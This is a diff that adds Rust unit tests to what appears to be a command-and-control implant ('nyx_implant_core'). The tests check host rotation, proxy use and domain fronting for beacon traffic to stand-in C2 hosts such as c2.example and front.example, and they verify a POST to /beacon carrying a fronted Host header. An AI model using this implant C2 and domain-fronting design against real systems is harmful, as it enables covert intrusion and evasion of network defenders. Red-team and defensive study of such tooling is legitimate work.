@@ -155,3 +155,77 @@ unsafe fn send_recv_dispatch(
     };
     result
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::testutil;
+    use nyx_implant_core::heap::String;
+    use std::time::Duration;
+
+    #[test]
+    fn select_target_plain_when_no_enhancements() {
+        let c = testutil::ctx("c2.example", 8443);
+        let (host, use_enhanced, has_rotation) = send_recv_select_target(&c);
+        assert_eq!(host, b"c2.example");
+        assert!(!use_enhanced);
+        assert!(!has_rotation);
+    }
+
+    #[test]
+    fn select_target_enhanced_when_fronting_or_proxy_or_rotation() {
+        let mut c = testutil::ctx("c2.example", 8443);
+        c.fronting_host = String::from("front.example");
+        let (_, enh, rot) = send_recv_select_target(&c);
+        assert!(enh && !rot);
+
+        let mut c = testutil::ctx("c2.example", 8443);
+        c.proxy_server = String::from("127.0.0.1:8080");
+        let (_, enh, rot) = send_recv_select_target(&c);
+        assert!(enh && !rot);
+
+        // Single rotation host: the connect host comes from the list, and any
+        // index value still selects it (mod len) — safe against the shared
+        // ROTATION_IDX under parallel tests.
+        let mut c = testutil::ctx("c2.example", 8443);
+        c.rotation_hosts = String::from("cdn1.example");
+        let (host, enh, rot) = send_recv_select_target(&c);
+        assert_eq!(host, b"cdn1.example");
+        assert!(enh && rot);
+    }
+
+    /// Plain path: no enhancements configured → post_frame to /beacon.
+    #[test]
+    fn send_recv_loopback_plain_path() {
+        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"OK"));
+        let c = testutil::ctx("127.0.0.1", port);
+        let out = unsafe { send_recv(&c, b"PING") };
+        assert_eq!(out.as_deref(), Some(b"OK".as_slice()));
+        let cap = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("server captured request");
+        assert!(cap.request_line.starts_with("POST /beacon "));
+    }
+
+    /// Enhanced path: rotation selects the (single) loopback host and the
+    /// fronting Host header reaches the wire — the CS 4.10 redirector +
+    /// domain-fronting shape end to end.
+    #[test]
+    fn send_recv_loopback_rotation_and_fronting_path() {
+        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"OK"));
+        let mut c = testutil::ctx("127.0.0.1", port);
+        c.rotation_hosts = String::from("127.0.0.1");
+        c.fronting_host = String::from("front.example");
+        let out = unsafe { send_recv(&c, b"PING") };
+        assert_eq!(out.as_deref(), Some(b"OK".as_slice()));
+        let cap = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("server captured request");
+        assert!(cap.request_line.starts_with("POST /beacon "));
+        assert!(
+            cap.headers.contains("host: front.example"),
+            "fronting Host header missing; got headers:\n{}",
+            cap.headers
+        );
+    }
+}
